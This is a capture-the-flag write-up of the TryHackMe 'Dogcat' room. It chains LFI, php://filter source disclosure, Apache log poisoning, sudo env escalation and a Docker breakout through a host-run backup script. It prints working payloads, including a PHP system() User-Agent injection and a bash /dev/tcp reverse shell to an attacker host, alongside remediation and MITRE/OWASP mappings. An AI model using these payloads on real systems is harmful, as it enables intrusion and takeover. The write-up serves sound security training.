# TryHackMe — Dogcat (LFI to RCE, Docker Breakout)

**Category:** Offensive Security / Web Application & Privilege Escalation
**Difficulty:** Medium
**Skills demonstrated:** Local File Inclusion (LFI) exploitation, PHP filter chain abuse, log poisoning for RCE, reverse shell deployment, GTFOBins privilege escalation, Docker container breakout via cron/backup script abuse

---

## 1. Scenario

The target exposed a simple web application allowing visitors to view a picture of a dog or a cat. Behind this trivial front end sat a vulnerable PHP file-inclusion mechanism that, once chained through several stages, led to full remote code execution, privilege escalation to root within a Docker container, and ultimately a breakout to root access on the underlying host system. Four flags were captured across the engagement, each corresponding to a distinct stage of compromise.

## 2. Objectives

1. Enumerate exposed services and the web application's attack surface.
2. Identify and exploit a file-inclusion vulnerability.
3. Escalate file read access into arbitrary command execution.
4. Obtain a stable reverse shell.
5. Escalate privileges to root inside the container.
6. Identify and exploit a container-to-host breakout vector.
7. Capture all four flags.

## 3. Reconnaissance

An initial service scan was run against the target:

```bash
nmap -sC -sV <target-ip>
```

**Results:**

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP |

With only SSH and HTTP exposed, the web application became the sole practical attack surface. Browsing to port 80 revealed a minimal application offering a choice between a "dog" or "cat" image, with the selection reflected back and an image rendered on the page.

## 4. Vulnerability Discovery — From IDOR to Path Traversal to LFI

Several hypotheses were tested systematically before landing on a working exploitation path:

**Attempt 1 — Insecure Direct Object Reference (IDOR):**
The rendered image path (`cats/3.jpg`) contained a numeric identifier. Enumerating this value via Burp Intruder confirmed a small, fixed set of images (10 per category) with no additional disclosure — a dead end for this vector.

**Attempt 2 — Direct path traversal:**
```
http://<target-ip>/?view=../../../../../etc/passwd
```
This was blocked by an application-level check restricting the `view` parameter to values containing "dog" or "cat".

**Attempt 3 — Parameter fuzzing around the restriction:**
```
http://<target-ip>/?view=dogs
```
The resulting error message leaked internal application behavior: the working directory (`/var/www/html/`), that `index.php` includes files based on the `view` parameter, that a `.php` extension is appended automatically, and that only PHP files could currently be read. This confirmed a **Local File Inclusion (LFI)** vulnerability with an extension-appending constraint.

**Attempt 4 — Self-reference workaround:**
Directly requesting `index` triggered an error, since the file including itself caused a function redeclaration conflict — but this error itself confirmed `index.php` was being successfully targeted:
```
http://<target-ip>/?view=./dog/../index
```

**Attempt 5 — Base64-wrapped exfiltration:**
To avoid the file being parsed as executable PHP (and therefore avoid the redeclaration error), PHP's built-in `php://filter` stream wrapper was used to Base64-encode the file contents before inclusion:
```
http://<target-ip>/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
```
This returned the full source of `index.php` as a Base64 blob, which was decoded locally:
```bash
cat index.php.encoded | base64 -d
```

## 5. Source Code Analysis

Reviewing the decoded `index.php` revealed the application's inclusion logic:

- A `containsStr()` function enforced that the `view` parameter must contain either "dog" or "cat".
- An optional `ext` parameter allowed overriding the default `.php` extension appended to the included file.
- Without `ext`, the application defaulted to appending `.php`.

This confirmed the LFI could be extended to include **arbitrary file types**, not just PHP — the missing piece needed to turn a file-read primitive into code execution.

## 6. Exploitation — Log Poisoning for Remote Code Execution

With arbitrary file inclusion confirmed, the next step was to convert this into RCE via **Apache access log poisoning**: injecting PHP code into a request field the server logs verbatim (the `User-Agent` header), then including that log file to trigger execution of the injected code.

The log's default location for the identified Ubuntu/Apache stack was confirmed as:
```
/var/log/apache2/access.log
```

A malicious `User-Agent` header containing an inline PHP code-execution snippet was sent:
```
GET /?view=./dog/../../../../../var/log/apache2/access.log&ext=&cmd=whoami HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

Since the `view` parameter now pointed at the log file (with `ext` blanked to avoid appending `.php`), the server executed the previously-logged PHP payload, running the command supplied via the `cmd` parameter. Testing with `whoami` returned `www-data`, confirming working remote code execution.

**Flag 1** was located and read from the current working directory using this command-execution primitive.

## 7. Establishing a Reverse Shell

Command-by-command execution via the LFI/log-poisoning chain was functional but impractical for sustained access, so a proper reverse shell was deployed:

1. A copy of the well-known PHP reverse shell (`pentestmonkey/php-reverse-shell`) was configured with the attacker's VPN (`tun0`) IP and a listening port (`4444`).
2. A local HTTP server was started to serve the payload:
   ```bash
   sudo python3 -m http.server 80
   ```
3. The RCE primitive was used to have the target download the payload with `curl`, saved as `shell.php`.
4. A listener was started:
   ```bash
   nc -nvlp 4444
   ```
5. The uploaded shell was triggered via a direct HTTP request, returning an interactive reverse shell as `www-data`.

## 8. Privilege Escalation (Container) — GTFOBins via `env`

Sudo permissions available to the current user were reviewed:

```bash
sudo -l
```

This revealed passwordless sudo rights to run `/usr/bin/env`. Cross-referencing this binary against **GTFOBins** confirmed a known privilege-escalation technique: `env` can be used to spawn a privileged shell when granted unrestricted sudo access, since it will execute any command handed to it with the invoking sudo context.

```bash
sudo env /bin/sh -p
whoami
```

This returned a **root** shell inside the container, and **Flag 3** was retrieved from `/root/flag3.txt`.

## 9. Locating Remaining Flags and Container Awareness

A filesystem search located the second flag:
```bash
find / -type f -name 'flag*.txt' 2>/dev/null
cat /var/www/flag2_QMW7JvaY2LvK.txt
```

**LinPEAS** was deployed to assist in locating the fourth flag and surfacing any further escalation opportunities:
```bash
cd /tmp
wget http://<attacker-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

The output revealed multiple Docker-related indicators, confirming the current environment was a **containerized shell**, not the underlying host — meaning the fourth flag likely resided outside the container's visible filesystem and required a container escape.

## 10. Container Breakout via Backup Script Abuse

Further review of `/opt` uncovered a backup mechanism:
```bash
ls -al /opt/backups
cat /opt/backups/backup.sh
```

The script archived a directory (`/root/container`) that did not exist inside the current container's filesystem — a strong indicator that `backup.sh` executes on a schedule **on the host**, not inside the container, and simply happens to be writable from within it. This is a classic host/container boundary misconfiguration: a script intended to run with host-level privileges was reachable and modifiable from an untrusted container context.

The script's contents were overwritten with a bash reverse shell payload:
```bash
cd /opt/backups
echo '#!/bin/bash' > backup.sh
echo 'bash -i >& /dev/tcp/<attacker-ip>/4445 0>&1' >> backup.sh
```

A listener was started to catch the resulting callback:
```bash
nc -nvlp 4445
```

Once the host's scheduler (cron or equivalent) executed the modified script, a reverse shell was received running as **root on the host system itself**, completing the container escape.

**Flag 4** was retrieved from `/root/flag4.txt` on the host.

## 11. Attack Chain Summary

```
Nmap recon → HTTP (80) as sole attack surface
      │
      ▼
IDOR test (image IDs) → dead end
      │
      ▼
Path traversal blocked → parameter fuzzing reveals LFI + extension logic
      │
      ▼
php://filter Base64 wrapper → index.php source disclosed
      │
      ▼
Source review → arbitrary extension inclusion via "ext" parameter
      │
      ▼
Apache access.log poisoning (malicious User-Agent) → RCE as www-data → Flag 1
      │
      ▼
PHP reverse shell uploaded and triggered → stable www-data shell
      │
      ▼
sudo -l → /usr/bin/env (GTFOBins) → root inside container → Flag 3
      │
      ▼
Filesystem search → Flag 2
      │
      ▼
LinPEAS → Docker container indicators identified
      │
      ▼
/opt/backups/backup.sh (host-executed, container-writable) → payload overwrite
      │
      ▼
Host-side cron execution → root reverse shell on host → Flag 4
```

## 12. Vulnerability & Exploitation Assessment

| # | Finding | Severity | Root Cause |
|---|---|---|---|
| 1 | Local File Inclusion (LFI) via the `view` parameter | Critical | Insufficient input validation on a user-controlled include path |
| 2 | Filter bypass via `php://filter` stream wrapper | High | LFI protections did not account for PHP stream-wrapper abuse to read file contents without execution |
| 3 | Arbitrary file extension inclusion via the `ext` parameter | Critical | Overly permissive design allowing inclusion of non-PHP files, enabling the log-poisoning path |
| 4 | Remote Code Execution via Apache access log poisoning | Critical | User-controlled request headers (User-Agent) logged verbatim and made includable/executable |
| 5 | Passwordless sudo rights on `/usr/bin/env` | Critical | Overly permissive sudoers configuration allowing trivial privilege escalation (GTFOBins) |
| 6 | Host-executed backup script writable from inside the container | Critical | Improper container/host trust boundary — a host-privileged scheduled script was reachable from an untrusted container filesystem |

## 13. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Reconnaissance | [T1595.001](https://attack.mitre.org/techniques/T1595/001/) | Active Scanning: Scanning IP Blocks | Initial Nmap service scan |
| Initial Access | [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | LFI vulnerability in the `view` parameter exploited for file disclosure and later RCE |
| Execution | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Command and Scripting Interpreter: Unix Shell | Commands executed via the log-poisoning RCE and later reverse shell |
| Defense Evasion / Execution | [T1027.001](https://attack.mitre.org/techniques/T1027/001/) | Obfuscated Files or Information: Binary Padding *(closest fit — filter-based encoding to bypass execution)* | `php://filter` Base64 encoding used to read source without triggering PHP execution |
| Persistence / Execution | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Server Software Component: Web Shell | PHP reverse shell uploaded and executed on the target |
| Privilege Escalation | [T1548.003](https://attack.mitre.org/techniques/T1548/003/) | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | Passwordless `sudo env` abused via a known GTFOBins technique to obtain a root shell |
| Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | LinPEAS enumeration revealing the containerized environment |
| Privilege Escalation / Escape to Host | [T1611](https://attack.mitre.org/techniques/T1611/) | Escape to Host | Overwriting a host-executed backup script from within the container to obtain host-level root access |
| Execution | [T1053](https://attack.mitre.org/techniques/T1053/) | Scheduled Task/Job | Host-side scheduled execution of the tampered `backup.sh` triggering the final reverse shell |

## 14. OWASP Top 10 Mapping (2021)

| OWASP Category | Relevance |
|---|---|
| **A03:2021 – Injection** | The core vulnerability chain: unsanitized `view`/`ext` parameters allowed local file inclusion, and log poisoning constitutes a form of code injection via the User-Agent header |
| **A01:2021 – Broken Access Control** | The application's own path-restriction logic (requiring "dog"/"cat" in the parameter) was insufficient and bypassable, allowing access to files well outside the intended scope |
| **A05:2021 – Security Misconfiguration** | Passwordless sudo on `env`, a writable host-executed backup script reachable from the container, and verbose error messages that leaked internal file paths and function names all reflect configuration failures rather than application logic flaws |
| **A08:2021 – Software and Data Integrity Failures** | The container-to-host breakout relied entirely on the integrity of a scheduled script not being protected against modification from a lower-trust context |
| **A09:2021 – Security Logging and Monitoring Failures** | The access log itself — normally a monitoring asset — was repurposed as an attacker-controlled code execution vector, and there was no apparent detection of the resulting anomalous log content or outbound connections |

## 15. Remediation Recommendations

| Finding | Recommendation |
|---|---|
| LFI via `view` parameter | Use a strict allow-list of valid file identifiers (not raw file paths) rather than string-matching/blacklisting; never pass user input directly into `include`/`require` |
| `php://filter` bypass | Disable or restrict PHP stream wrappers where not explicitly required; validate resolved file paths against a canonical allow-list after any wrapper processing |
| Arbitrary extension inclusion via `ext` | Remove the ability for user input to control the included file's extension; hardcode expected extensions server-side |
| Log poisoning RCE | Disable log inclusion entirely from the web root; ensure log directories are not reachable via LFI, and sanitize/encode logged request headers |
| Passwordless sudo on `env` | Remove unnecessary sudo grants; if `env` access is required, restrict it with a wrapper script and explicit argument allow-listing rather than blanket NOPASSWD |
| Host-executed script writable from container | Enforce strict container isolation — scripts executed with host privileges must never be writable from within a container; use read-only bind mounts for any shared automation scripts |
| Verbose error messages | Disable detailed error output in production; log internal errors server-side only, and return generic messages to clients |

## 16. Key Takeaways

- **A single unsanitized parameter can cascade into full system compromise.** What began as a cosmetic dog/cat image selector ultimately enabled file disclosure, RCE, root access, and a full container escape — all traceable to one unvalidated `view` parameter.
- **PHP stream wrappers are a frequently underestimated LFI escalation tool.** `php://filter` turned a "read-only" file inclusion bug into full source code disclosure without ever triggering execution, which is what made the log-poisoning path discoverable in the first place.
- **Log files are executable code waiting for a trigger.** Any LFI vulnerability combined with an attacker-controlled, server-logged value (headers, URLs, referrers) should be treated as a potential RCE primitive, not just an information-disclosure issue.
- **Container boundaries are only as strong as their shared resources.** The final host compromise did not require any container-escape exploit — it required nothing more than a host-side script trusting content from inside the container.

## 17. Conclusion

This engagement illustrates how a chain of individually moderate web application flaws — an under-validated inclusion parameter, a permissive extension override, and a poorly-isolated backup automation script — combined to produce a complete compromise spanning application, container, and host boundaries. Strong input validation at the web layer and strict isolation between container and host automation would have independently broken this chain at several points.

## 18. Methodology Note

The overall attack path and command sequence in this write-up were adapted from a publicly shared methodology for this room; the steps were independently reproduced and verified against the provided environment. The structure, explanations, and analysis above were written independently rather than following that source's narrative style or format.
